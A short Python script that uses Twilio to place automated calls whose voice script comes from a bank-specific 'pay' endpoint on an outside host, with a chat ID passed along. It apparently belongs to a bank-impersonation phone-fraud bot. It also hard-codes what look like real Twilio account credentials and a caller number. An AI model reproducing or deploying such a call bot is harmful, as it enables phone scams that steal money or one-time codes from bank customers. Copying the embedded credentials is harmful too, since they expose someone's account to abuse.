from twilio.rest import Client

def make_call(number, bank, chat_id):
    account_sid = "AC835de05f30370a769a77c0a4bb8ee4bf"
    auth_token = "0e88045f6a9520c3161bcc027fb77dc9"
    twilio_phone_number = "+15162170229"

    client = Client(account_sid, auth_token)

    call = client.calls.create(
        url=f'https://achlive-api.vercel.app/pay/voice/{bank}/{chat_id}/',
        to=number,
        from_=twilio_phone_number
    )

    print("Call SID:", call.sid)

# Example usage:
make_call("+2330599971083", "example_bank", "example_chat_id")
